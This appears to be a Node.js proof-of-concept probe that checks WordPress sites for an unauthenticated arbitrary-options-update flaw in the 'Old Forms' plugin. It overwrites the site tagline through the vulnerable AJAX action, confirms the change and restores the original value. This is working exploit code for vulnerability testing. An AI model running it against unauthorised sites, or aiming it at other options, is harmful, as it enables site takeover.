#!/usr/bin/env node
/**
 * Exploit-verification probe for:
 *   Old Forms <= 1.4.2 - Unauthenticated Arbitrary Options Update
 *   (CVE-2026-90003)
 *
 * The plugin registers an AJAX action `of_save_field` for both
 * authenticated and unauthenticated (`nopriv`) requests, which calls
 * update_option( $_POST['key'], $_POST['value'] ) with no capability
 * check and no restriction on which option key may be touched.
 *
 * This probe:
 *   1. Reads the current site tagline (`blogdescription` option) via the
 *      unauthenticated WP REST root route.
 *   2. Attempts to overwrite it with a unique marker value via the
 *      vulnerable `of_save_field` AJAX action, with no authentication.
 *   3. Re-reads the tagline via REST to see if the marker stuck.
 *   4. Restores the original tagline value (best effort).
 *   5. Exits 0 if the option was successfully overwritten (vulnerable),
 *      or 1 if it was not (not vulnerable / fixed).
 *
 * Usage: node probe.mjs <base-url>
 */

const baseUrl = process.argv[2];

if (!baseUrl) {
  console.error('Usage: node probe.mjs <base-url>');
  process.exit(1);
}

const base = baseUrl.replace(/\/+$/, '');
const AJAX_URL = `${base}/wp-admin/admin-ajax.php`;
const REST_ROOT_URL = `${base}/?rest_route=/`;

async function getTagline() {
  const res = await fetch(REST_ROOT_URL, { method: 'GET' });
  if (!res.ok) {
    throw new Error(`REST root request failed with status ${res.status}`);
  }
  const data = await res.json();
  if (typeof data.description !== 'string') {
    throw new Error('REST root response did not contain a "description" field');
  }
  return data.description;
}

async function setFieldViaAjax(key, value) {
  const body = new URLSearchParams({
    action: 'of_save_field',
    key,
    value,
  });
  const res = await fetch(AJAX_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    body: body.toString(),
  });
  let json = null;
  try {
    json = await res.json();
  } catch {
    // Non-JSON response (e.g. error page); leave json as null.
  }
  return { status: res.status, json };
}

async function main() {
  let originalTagline;
  try {
    originalTagline = await getTagline();
  } catch (err) {
    console.error(`[probe] Could not read baseline tagline via REST API: ${err.message}`);
    console.error('[probe] Treating target as NOT exploitable (cannot verify).');
    process.exit(1);
  }

  const marker = `of_probe_${Date.now()}_${Math.random().toString(36).slice(2)}`;

  console.error(`[probe] Original blogdescription: ${JSON.stringify(originalTagline)}`);
  console.error(`[probe] Attempting unauthenticated update_option via of_save_field AJAX action...`);

  const ajaxResult = await setFieldViaAjax('blogdescription', marker);
  console.error(`[probe] AJAX response status=${ajaxResult.status} body=${JSON.stringify(ajaxResult.json)}`);

  let afterTagline = null;
  let readErr = null;
  try {
    afterTagline = await getTagline();
  } catch (err) {
    readErr = err;
  }

  const exploited = afterTagline === marker;

  if (exploited) {
    console.error(`[probe] Confirmed: blogdescription option was overwritten to marker value via unauthenticated AJAX request.`);
  } else {
    console.error(`[probe] blogdescription was NOT overwritten (got ${JSON.stringify(afterTagline)}${readErr ? `, read error: ${readErr.message}` : ''}).`);
  }

  // Best-effort restore of original state, regardless of outcome.
  try {
    if (exploited) {
      await setFieldViaAjax('blogdescription', originalTagline);
      const restored = await getTagline();
      if (restored === originalTagline) {
        console.error('[probe] Restored original blogdescription value.');
      } else {
        console.error(`[probe] WARNING: failed to confirm restoration of original blogdescription (now ${JSON.stringify(restored)}).`);
      }
    }
  } catch (err) {
    console.error(`[probe] WARNING: error while attempting to restore original state: ${err.message}`);
  }

  if (exploited) {
    console.error('[probe] RESULT: VULNERABLE');
    process.exit(0);
  } else {
    console.error('[probe] RESULT: NOT VULNERABLE');
    process.exit(1);
  }
}

main().catch((err) => {
  console.error(`[probe] Unexpected error: ${err.stack || err.message}`);
  process.exit(1);
});
